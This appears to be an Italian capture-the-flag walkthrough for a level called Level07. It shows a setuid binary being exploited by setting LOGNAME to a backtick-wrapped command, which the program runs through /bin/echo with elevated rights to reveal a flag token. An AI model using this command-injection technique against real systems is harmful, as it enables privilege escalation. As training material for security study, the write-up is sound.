# Level07
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
Abbiamo un eseguibile che stampa il nome utente, analizzando con il comando:
```bash
strings level07
```
notiamo l'utilizzo della funzione `getenv`, la stringa `/bin/echo %s` usata molto
probabilmente dalla funzione `asprintf` anch'essa presente nell'output e la variabile
d'ambiente `LOGNAME` usata sicuramente nella formattazione `%s` di `asprintf`.
In effetti facendo un veloce controllo con il comando `env` notiamo subito la variabile:
```bash
LOGNAME=level07
```

### 2 passaggio:
Con il seguente comando cambiamo la variabile `LOGNAME`:
```bash
export LOGNAME=\`getflag\`
```
e di conseguenza ora basta avviare l'eseguibile per avere il seguente output:
```bash
./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
